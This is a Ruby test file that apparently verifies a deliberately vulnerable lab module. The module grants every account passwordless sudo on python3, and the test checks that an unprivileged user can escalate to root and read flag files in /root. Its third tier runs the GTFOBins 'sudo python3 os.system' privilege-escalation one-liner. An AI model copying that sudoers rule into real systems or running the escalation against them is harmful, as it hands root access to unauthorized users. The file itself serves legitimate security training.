require_relative '../../../../../lib/post_provision_test'


class SudoRootPython3Test < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_python3'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # Inputs: leaked_filenames and strings_to_leak are both checked below.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      rule = '/etc/sudoers.d/10_users_sudo_python3'
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' #{rule}", 'root:root 440')
      test_local_command('sudoers rule allows python3 as root with no password',
                         "cat #{rule}", 'ALL  ALL=(root) NOPASSWD: /usr/bin/python3 *, /usr/bin/python3.* *')
      test_local_command('sudoers rule file for sudo -l present',
                         'cat /etc/sudoers.d/10_users_sudo_list', 'NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers configuration is valid', 'visudo -c 2>&1; echo rc=$?', 'rc=0')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # what a student sees: sudo -n -l lists python3 for any account
      test_local_command('unprivileged user lists the python3 sudo rule', 'sudo -n -l', '/usr/bin/python3', user: 'nobody')
      test_local_command('unprivileged user runs python3 as root via sudo',
                         %q{sudo -n /usr/bin/python3 -c 'import os; print(os.getuid())'}, '0', user: 'nobody')
      # the flag is not readable without escalating
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_command_succeeds("unprivileged user cannot read leaked #{fname} directly",
                              "! cat #{Shellwords.escape("/root/#{fname}")} 2>/dev/null", user: 'nobody')
      end
    end

    # Tier 3: local privilege escalation, no Metasploit module. A throwaway
    # unprivileged account (created and removed by with_throwaway_ssh_user) uses the
    # GTFOBins python3 "sudo" technique (python3 spawning a shell command as root)
    # and reads the root-only flag. <privilege>=root_rwx, so the shell must be uid 0.
    tier(3) do
      if leaked.empty?
        skip_check('python3 sudo privesc', 'no leaked_filenames to read as root', tier: 3)
      else
        flag_paths = leaked.map { |f| Shellwords.escape("/root/#{f}") }.join(' ')
        with_throwaway_ssh_user do |user, _pass|
          exploit = %Q{sudo -n /usr/bin/python3 -c 'import os; os.system("id; cat #{flag_paths}")'}
          out = run_as_user(user, exploit)
          body = "#{out[:stdout]}\n#{out[:stderr]}"
          add_evidence('sudo_root_python3_privesc', "echo #{Shellwords.escape(body)}")

          if body =~ /uid=0\(root\)/
            pass_check("#{user} escalates to root via sudo python3 (GTFOBins)",
                       "privesc shell is root: #{body[/uid=\S+/]} - <privilege>=root_rwx verified", tier: 3)
          else
            fail_check("#{user} escalates to root via sudo python3 (GTFOBins)",
                       "expected a root shell (uid=0); got #{body[/uid=\S+/] || body[0, 200].inspect}", tier: 3)
          end

          present = strings.reject { |s| s.strip.empty? }
          if present.empty?
            skip_check('root-only flag content read after escalation', 'no strings_to_leak supplied', tier: 3)
          else
            missing = present.reject { |s| body.include?(s) }
            if missing.empty?
              pass_check('root-only flag content read after escalation',
                         'every leaked string recovered via the root shell', tier: 3)
            else
              fail_check('root-only flag content read after escalation',
                         "leaked string(s) #{missing.map(&:inspect).join(', ')} not recovered via the escalation", tier: 3)
            end
          end
        end
      end
    end
  end

end

SudoRootPython3Test.new.run
